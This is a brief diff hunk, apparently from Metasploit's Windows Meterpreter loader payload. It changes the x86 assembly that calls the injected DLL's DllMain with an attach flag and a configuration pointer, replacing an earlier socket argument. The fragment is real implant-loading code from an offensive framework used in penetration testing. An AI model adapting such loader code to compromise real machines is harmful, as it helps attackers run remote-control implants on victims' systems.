@@ -56,8 +56,7 @@ module Payload::Windows::MeterpreterLoader
           push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
           push eax              ; push some arbitrary value for hInstance
-          mov ebx, eax          ; save DllMain for another call
-          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
   end
 
